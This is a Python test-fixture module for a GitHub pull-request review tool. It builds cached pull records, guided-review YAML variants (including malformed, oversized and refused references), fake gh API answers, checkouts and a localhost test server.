_SLOW_NOTE_STEP = f"""\
    - title: Start with the count
      note: |-
        {"[" * 100 + "%" * (60 * 1024)}
      references:
        - {{path: src/app.txt, side: new, start_line: 1, end_line: 2}}
"""


# References the format refuses, each in a step of its own: a range in another pull
# request's file, a commit beside a path, a commit beside a pull request, and a commit
# named by a short SHA.
_REFUSED_REFERENCES: Final[dict[str, str]] = {
    "pull-file-range": "{pull: 10, path: docs/draft.md, side: new, start_line: 1, end_line: 1}",
    "commit-and-path": '{commit: "' + "e" * 40 + '", path: src/app.txt}',
    "commit-and-pull": '{commit: "' + "e" * 40 + '", pull: 8}',
    "short-commit": '{commit: "85fcb2f"}',
}


# The guides `--describe` writes into a cached description: the stand-in guide's steps each
# in a group, the first with a note; groups mixed with a step; a longer guide, two groups
# of two steps each, which tells numbering through the groups from numbering by entry;
# ten steps in no group, whose numbers run to two digits from the list's edge;
# notes in Markdown, a group's of two steps and the first step's; a note too slow to
# render; and blocks the page refuses: an empty group, a group inside a group, and each
# reference of `_REFUSED_REFERENCES` after the count's step.
GUIDE_VARIANTS: Final[dict[str, str]] = {
    "grouped": (
        "    - title: The count\n"
        "      note: Read the value before its explanation.\n"
        "      items:\n" + _in_group(_COUNT_STEP) + "    - title: The docs\n"
        "      items:\n" + _in_group(_DOCS_STEP + _MORE_DOCS_REFERENCES)
    ),
    "mixed": (
        "    - title: The count\n"
        "      note: Read the value before its explanation.\n"
        "      items:\n" + _in_group(_COUNT_STEP) + _DOCS_STEP
    ),
    "longer": (
        "    - title: The count\n"
        "      items:\n" + _in_group(_COUNT_STEP + _OLD_COUNT_STEP) + "    - title: The docs\n"
        "      items:\n" + _in_group(_DOCS_STEP + _WHOLE_STEP)
    ),
    "ten-steps": (_COUNT_STEP + _DOCS_STEP) * 5,
    "markdown": (
        "    - title: The count\n"
        "      note: Read the `count` before *its* explanation.\n"
        "      items:\n" + _in_group(_MARKDOWN_STEP + _OLD_COUNT_STEP) + _DOCS_STEP
    ),
    "slow-note": _SLOW_NOTE_STEP + _DOCS_STEP,
    "empty-group": "    - title: The count\n      items: []\n" + _DOCS_STEP,
    "nested-group": (
        "    - title: The count\n"
        "      items:\n"
        "        - title: The value\n"
        "          items:\n" + _in_group(_in_group(_COUNT_STEP))
    ),
    **{
        name: _COUNT_STEP
        + f"    - title: Cite it\n      note: Check it.\n      references:\n        - {reference}\n"
        for name, reference in _REFUSED_REFERENCES.items()
    },
}


def _past_max_items(_head: str) -> str:
    """Two groups whose steps pass MAX_ITEMS together, though each list is within its own
    bound, so only the total refuses the guide."""
    from metabrowser.builtin_plugins.github.guided_review import MAX_ITEMS

    group = _in_group(_COUNT_STEP) * (MAX_ITEMS // 2)
    return "".join(f"    - title: Part {part}\n      items:\n{group}" for part in (1, 2))


# A step that cites past this pull request: a layer of its stack, a document another pull
# request changes and a patch a third does, a pull request this copy knows from its list
# alone and one it has not read, the guide's own head as a commit, and a commit the store
# lacks.
_MISSING_COMMIT: Final = "e" * 40


def _kinds_step(head: str) -> str:
    return f"""\
    - title: Read it beside its neighbors
      note: Check the layer below and the draft above it.
      references:
        - {{pull: 8}}
        - {{pull: 10, path: docs/draft.md}}
        - {{pull: 9, path: src/app.txt}}
        - {{pull: 50}}
        - {{pull: 2000}}
        - {{commit: "{head}"}}
        - {{commit: "{_MISSING_COMMIT}"}}
"""


def _kinds(head: str) -> str:
    """The count's step, then a step of every other kind of reference (:func:`_kinds_step`)."""
    return _COUNT_STEP + _kinds_step(head)


# The guides `--describe` builds as it writes one, from the format's bounds, so they follow
# the constants, or from the guide's head: a guide past MAX_ITEMS, and one of every kind of
# reference.
BUILT_VARIANTS: Final[dict[str, Callable[[str], str]]] = {
    "past-max-items": _past_max_items,
    "kinds": _kinds,
}


def grouped_guide_body(origin: Origin) -> str:
    """The stand-in guide of :func:`guide_body` with each of its steps in a group."""
    return _guide_body(origin["base"], origin["fork_head"], GUIDE_VARIANTS["grouped"])


def kinds_guide_body(origin: Origin) -> str:
    """The stand-in guide's count step, then a step that cites every other kind of
    reference (``kinds`` of :data:`BUILT_VARIANTS`)."""
    return _guide_body(origin["base"], origin["fork_head"], _kinds(origin["fork_head"]))


def commits_guide_body(origin: Origin, commits: Sequence[str]) -> str:
    """The stand-in guide's count step, then a step that cites each of *commits*."""
    cited = "".join(f'        - {{commit: "{commit}"}}\n' for commit in commits)
    step = (
        "    - title: Read the commits\n      note: Check each commit.\n      references:\n" + cited
    )
    return _guide_body(origin["base"], origin["fork_head"], _COUNT_STEP + step)


def markdown_guide_body(origin: Origin) -> str:
    """The stand-in guide with Markdown in its notes (``markdown`` of :data:`GUIDE_VARIANTS`)."""
    return _guide_body(origin["base"], origin["fork_head"], GUIDE_VARIANTS["markdown"])


# The files a documents build adds to pull request 7's head: a YAML file, which a step that
# cites it whole draws as Changes does, and a Markdown file whose whole patch charges past
# MAX_STEP_PATCH_BYTES in guided_review.py, though the file is inside the rendered route's
# read bound, as test_guided_review_route.py checks.
_DOCUMENT_FILES: Final[dict[str, str]] = {
    "config/settings.yaml": "count: 2\nname: demo\n",
    "docs/large.md": "# Large\n\n"
    + "".join(
        f"Paragraph {n} of a document a step cites whole, past the step's budget for whole files.\n\n"
        for n in range(1, 3001)
    ),
}


def _document_step(paths: tuple[str, ...]) -> str:
    """A step that names docs/new.md and each of *paths* whole: files the rendered route
    renders, which the guide draws whole, and, with docs/large.md, src/app.txt after it,
    whose patch still has the step's whole budget."""
    cited = ("docs/new.md", *paths, *(("src/app.txt",) if "docs/large.md" in paths else ()))
    return (
        "    - title: Read the new guide whole\n"
        "      note: Check that it reads as a document.\n"
        "      references:\n" + "".join(f"        - {{path: {path}}}\n" for path in cited)
    )


# The guide of a stack whose bottom's merge base is the stand-in's base and whose top is 10,
# as stack 70 (8, then 10) reads it: a group with a note over the layers, then the draft
# whole, as tests/test_cli_github_stack_golden.py's top guide reads them without the group.
_STACK_GUIDE_ITEMS: Final = """\
    - title: Orientation
      note: The stack's two layers, bottom first.
      items:
        - title: The layers
          note: 8 extends the guide; 10 starts a draft on top of it.
          references:
            - {pull: 8}
            - {pull: 10}
    - title: The draft
      note: Read the draft whole.
      references:
        - {path: docs/draft.md}
"""


def _add_stack_guide(origin: Origin, answers: dict[str, Any]) -> None:
    """10's description, with a `stack-review` block pinned to the base and 10's head after
    what it says: the guide of a stack whose top is 10, which 10 carries."""
    pull = answers["api"]["repos/octo/demo/pulls/10"]["body"]
    pull["body"] = f"""{pull["body"]}

```stack-review
softschema:
  contract: metabrowser.collection:Collection/v1
  envelope: collection
  status: enforced
collection:
  comparison:
    merge_base: "{origin["base"]}"
    head: "{origin["draft_head"]}"
  items:
{_STACK_GUIDE_ITEMS}```
"""


def _add_guides(origin: Origin, answers: dict[str, Any], *, documents: tuple[str, ...]) -> None:
    fence = guide_body(origin)
    api = answers["api"]
    if documents:
        head, close, tail = fence.rpartition("```")
        api["repos/octo/demo/pulls/7"]["body"]["body"] = (
            head + _document_step(documents) + close + tail
        )
    else:
        api["repos/octo/demo/pulls/7"]["body"]["body"] = fence
    api["repos/octo/demo/pulls/8"]["body"]["body"] = fence
    api["repos/octo/demo/pulls/9"]["body"]["body"] = fence + "\n" + fence


def describe(directory: Path, number: int, variant: str) -> None:
    """Write the guide *variant* of :data:`GUIDE_VARIANTS` or :data:`BUILT_VARIANTS` into the
    cached description of pull request *number* in the home :func:`build_home` wrote with
    ``--guided``, pinned as the guide already there is, as a fetch of the edited description
    would leave it. The pins are read as :func:`_guide_body` writes them, so a variant the
    page refuses can follow another."""

    from metabrowser.builtin_plugins.github.pull_record import (
        PullRecord,
        read_pull_record,
        write_pull_record,
    )

    home = directory / "home"
    record = read_pull_record(home, _source_slug(), number)
    assert isinstance(record, PullRecord)
    pins = re.search(
        r'^    merge_base: "([0-9a-f]{40})"\n    head: "([0-9a-f]{40})"$', record.pull.body, re.M
    )
    assert pins is not None, f"pull request {number} has no guide to rewrite"
    items = (
        GUIDE_VARIANTS[variant] if variant in GUIDE_VARIANTS else BUILT_VARIANTS[variant](pins[2])
    )
    body = _guide_body(pins[1], pins[2], items)
    pull = record.pull.model_copy(update={"body": body})
    write_pull_record(home, _source_slug(), record.model_copy(update={"pull": pull}))


def _source_slug() -> str:
    from metabrowser.cache.identity import cache_slug, source_identity

    return cache_slug(
        "https", CANONICAL, source_identity("https", CANONICAL), slug_owner=lambda _slug: None
    )


def build_lists(directory: Path, answers: Mapping[str, Any]) -> None:
    """One complete shared catalog, last read as another account, for cache-only goldens."""

    from metabrowser.builtin_plugins.github.pull_catalog import publish_page, read_catalog
    from metabrowser.builtin_plugins.github.pull_list import ListedRepository
    from metabrowser.builtin_plugins.github.pull_list_refresh import refresh_pull_list

    repository = ListedRepository(directory / "home", _source_slug(), "octo", "demo")
    asyncio.run(refresh_pull_list(repository, "open"))
    other = json.loads(json.dumps(answers))
    other["auth"] = account(ANOTHER_READER)
    for key, entry in other["api"].items():
        if key.startswith("graphql:"):
            entry["body"]["data"]["viewer"]["login"] = ANOTHER_READER
    os.environ.update(install_fake_gh(directory, other))
    asyncio.run(refresh_pull_list(repository, "open"))
    # The static read-only fixture has one epoch. Pin that opaque random identity,
    # just as its clock is pinned; runtime account/reset tests use real unique epochs.
    current = read_catalog(repository.home, repository.slug)
    assert current is not None
    fixed = current.model_copy(update={"epoch": "00000000000000000000000000000001"})
    assert publish_page(repository, current, fixed, ())
    os.environ.update(install_fake_gh(directory, answers))


def build_file_lists(directory: Path, answers: Mapping[str, Any]) -> None:
    """Lists of changed files, each through ``POST pull-files-refresh`` in a one-shot command.

    7 from the local comparison of its record; 106 and the capped 105 from GitHub's pages;
    104 stopped at its third page by GitHub's rate limit; 103 read by another account, and
    then refreshed, and failed, as this one. 12 and 13 are lists the route cannot use.
    """

    from uuid import UUID

    from metabrowser.builtin_plugins.github import pull_files_refresh
    from metabrowser.cache.paths import source_pull_files
    from metabrowser.cli.main import _run_cli  # pyright: ignore[reportPrivateUsage]
    from metabrowser.home import write_private_file_atomic

    halted = CAPPED_PULL - 1
    limited = {
        "status": 403,
        "headers": {"X-Ratelimit-Remaining": "0", "X-Ratelimit-Reset": "1790181960"},
        "body": {"message": "API rate limit exceeded"},
    }
    with_files = {**answers, "api": {**answers["api"], **file_entries()}}
    pages = {
        **file_pages(halted, tree_files()),
        files_page(halted, 3): limited,
        **file_pages(halted - 1, tree_files()[:2]),
    }
    offline = {"stderr": "error connecting to api.github.com\n", "exit": 1}
    others = {**with_files, "api": {**with_files["api"], **pages}}
    # Each run, and whether it succeeds. 103's last refresh ran as this reader and failed,
    # after another account read the list.
    runs: list[tuple[int, Mapping[str, Any], bool]] = [
        (7, with_files, True),
        (TREE_PULL, with_files, True),
        (CAPPED_PULL, with_files, True),
        (halted, others, False),
        (halted - 1, {**others, "auth": account(ANOTHER_READER)}, True),
        (halted - 1, {**others, "api_failure": offline}, False),
    ]
    request = directory / "files-request.json"
    refresh = "/api/plugin/github/pull-files-refresh"
    for generation, (number, scenario_answers, succeeds) in enumerate(runs, start=1):
        os.environ.update(install_fake_gh(directory, scenario_answers))
        request.write_text(json.dumps({"number": number, "retry": True}) + "\n", encoding="utf-8")
        try:
            with _patched(
                pull_files_refresh, "uuid4", lambda generation=generation: UUID(int=generation)
            ):
                _run_cli([CANONICAL, "--api", refresh, "--data", str(request)])
        except SystemExit as exc:
            if (exc.code in (0, None)) != succeeds:
                raise
    os.environ.update(install_fake_gh(directory, answers))
    request.unlink()
    home, slug = directory / "home", _source_slug()
    write_private_file_atomic(
        home, source_pull_files(slug, 12), json.dumps({"schema_version": 0}).encode()
    )
    write_private_file_atomic(home, source_pull_files(slug, 13), b"{not json")


def write_damaged_records(home: Path) -> None:
    """Records the route cannot use: 12 from another schema, 13 not JSON at all."""

    from metabrowser.cache.paths import source_pull_record
    from metabrowser.home import write_private_file_atomic

    slug = _source_slug()
    write_private_file_atomic(
        home, source_pull_record(slug, 12), json.dumps({"schema_version": 0}).encode()
    )
    write_private_file_atomic(home, source_pull_record(slug, 13), b"{not json")


def serve_stand_in(
    directory: Path, number: int, port: int, *, exit_on_eof: bool = False, checkout: bool = False
) -> None:
    """Serve pull request *number* from a home :func:`build_home` wrote, for a browser.

    The same seams as :func:`build_home`, with the real clock, so the records read as
    stale and a refresh through the page asks the fake ``gh`` again. Nothing leaves
    ``127.0.0.1``: the mirror refreshes from the ``file://`` origin. With *exit_on_eof* the
    server stops when its standard input closes, as a test that owns it needs. With
    *checkout* it serves a reader's clone of the origin (:func:`clone_checkout`), made beside
    the home, which lacks 7's head, so a guide's commit row names that commit, fetched with
    its pull request, as not in this checkout.
    """

    from metabrowser.cache import acquire
    from metabrowser.cache.urls import GitSource
    from metabrowser.cli.main import _run_cli  # pyright: ignore[reportPrivateUsage]
    from metabrowser.git.process import detect_git_version

    answers = json.loads((directory / "fake-gh-scenario.json").read_text(encoding="utf-8"))
    os.environ.update(install_fake_gh(directory, answers))
    os.environ["METABROWSER_CACHE_DIR"] = str(directory / "home")
    local = (directory / "github-pull-origin.git").as_uri()
    version, _raw = detect_git_version()

    def remote_url_for(source: GitSource) -> str:
        return local if source.normalized == CANONICAL else source.normalized

    served = f"{CANONICAL}/pull/{number}"
    if checkout:
        origin = Origin(directory / "github-pull-origin.git", {})
        served = str(clone_checkout(origin, directory / "checkout"))
    with (
        _patched(acquire, "remote_url_for", remote_url_for),
        _patched(acquire, "require_acquisition_git", lambda: version),
    ):
        _run_cli(
            [served, "--no-open", "--port", str(port)] + (["--exit-on-eof"] if exit_on_eof else [])
        )


# The checkouts :func:`build_checkout_home` makes, each with its ``origin`` and any other
# remote: the repository by HTTPS and by SSH, a fork of it, a remote the plugin's grammar
# refuses though discovery admits it, and one that is not GitHub.
CHECKOUTS: Final[dict[str, tuple[str, tuple[tuple[str, str], ...]]]] = {
    "checkout": (CANONICAL + ".git", ()),
    "ssh-checkout": ("git@github.com:Octo/Demo.git", ()),
    "fork-checkout": ("https://github.com/someone/demo.git", (("upstream", CANONICAL + ".git"),)),
    "odd-checkout": ("https://github.com/under_score/demo.git", ()),
    "elsewhere": ("https://gitlab.example/octo/demo.git", ()),
}


def build_checkout_home(directory: Path) -> None:
    """Checkouts of the stand-in, and ``home`` as their folder servers' requests wrote it.

    Through the production CLI path, ``metab <checkout> --api`` with the fake ``gh`` and a
    fixed clock: the ``all`` list's first page, the records of 10, whose head is the
    checkout's ``HEAD``, and of 7, which it lacks, and 7's changed files, all from
    ``checkout``. No store is made, so the source is ``unattached``. ``folder`` is a plain
    directory.
    """

    from metabrowser.builtin_plugins.github import pull_list, pulls
    from metabrowser.cache import acquire
    from metabrowser.cli.main import _run_cli  # pyright: ignore[reportPrivateUsage]

    origin = build_origin(directory)
    for name, (remote, more) in CHECKOUTS.items():
        path = clone_checkout(origin, directory / name, remote=remote)
        for remote_name, url in more:
            subprocess.run(
                ["git", "-C", str(path), "remote", "add", remote_name, url],
                check=True,
                capture_output=True,
                env=git_env(directory),
            )
    os.environ.update(install_fake_gh(directory, files_scenario(origin)))
    os.environ["METABROWSER_CACHE_DIR"] = str(directory / "home")
    os.environ["METABROWSER_LOG_LEVEL"] = "ERROR"
    request = directory / "request.json"
    asked: list[tuple[str, dict[str, Any]]] = [
        ("/api/plugin/github/pulls-refresh", {}),
        ("/api/plugin/github/pull-refresh", {"number": 10, "retry": True}),
        ("/api/plugin/github/pull-refresh", {"number": 7, "retry": True}),
        ("/api/plugin/github/pull-files-refresh", {"number": 7}),
    ]
    with (
        _patched(pulls, "utc_now", lambda: FETCHED_AT),
        _patched(pulls, "monotonic_ns", count(0, 425_000_000).__next__),
        _patched(pull_list, "utc_now", lambda: FETCHED_AT),
        _patched(acquire, "canonical_now", lambda: FETCHED_AT.strftime("%Y-%m-%dT%H:%M:%SZ")),
    ):
        for route, body in asked:
            request.write_text(json.dumps(body) + "\n", encoding="utf-8")
            try:
                _run_cli([str(directory / "checkout"), "--api", route, "--data", str(request)])
            except SystemExit as exc:
                if exc.code not in (0, None):
                    raise
    request.unlink()
    (directory / "folder").mkdir(exist_ok=True)


def run_files_refresh(args: list[str]) -> None:
    """The real CLI with only its file-list UUID pinned for the static transcript."""

    from uuid import UUID

    from metabrowser.builtin_plugins.github import pull_files_refresh
    from metabrowser.cli.main import _run_cli  # pyright: ignore[reportPrivateUsage]

    with _patched(pull_files_refresh, "uuid4", lambda: UUID(int=15)):
        _run_cli(args)


if __name__ == "__main__":
    if len(sys.argv) > 2 and sys.argv[1] == "--files-refresh":
        run_files_refresh(sys.argv[2:])
    elif len(sys.argv) == 3 and sys.argv[2] == "--checkout":
        build_checkout_home(Path(sys.argv[1]).resolve())
    elif (
        len(sys.argv) in (5, 6, 7)
        and sys.argv[2] == "--serve"
        and sys.argv[5:] in ([], ["--exit-on-eof"], ["--checkout"], ["--checkout", "--exit-on-eof"])
    ):
        serve_stand_in(
            Path(sys.argv[1]).resolve(),
            int(sys.argv[3]),
            int(sys.argv[4]),
            exit_on_eof="--exit-on-eof" in sys.argv[5:],
            checkout="--checkout" in sys.argv[5:],
        )
    elif len(sys.argv) == 3 and sys.argv[2] == "--files":
        build_home(Path(sys.argv[1]).resolve(), files=True)
    elif len(sys.argv) == 3 and sys.argv[2] == "--guided":
        build_home(Path(sys.argv[1]).resolve(), guided=True)
    elif len(sys.argv) == 3 and sys.argv[2] == "--guided-stack":
        build_home(Path(sys.argv[1]).resolve(), guided=True, stack_guide=True)
    elif len(sys.argv) == 3 and sys.argv[2] in ("--guided-documents", "--guided-large-document"):
        build_home(
            Path(sys.argv[1]).resolve(),
            guided=True,
            documents=True,
            large=sys.argv[2] == "--guided-large-document",
        )
    elif (
        len(sys.argv) == 5
        and sys.argv[2] == "--describe"
        and sys.argv[4] in {*GUIDE_VARIANTS, *BUILT_VARIANTS}
    ):
        describe(Path(sys.argv[1]).resolve(), int(sys.argv[3]), sys.argv[4])
    elif len(sys.argv) == 2:
        build_home(Path(sys.argv[1]).resolve())
    else:
        raise SystemExit(
            "usage: github_pull_fixture.py <directory> "
            "[--files | --guided | --guided-stack | --guided-documents "
            "| --guided-large-document | --checkout "
            "| --serve <number> <port> [--checkout] [--exit-on-eof] "
            f"| --describe <number> {{{','.join([*GUIDE_VARIANTS, *BUILT_VARIANTS])}}}] "
            "or --files-refresh <metab arguments>"
        )
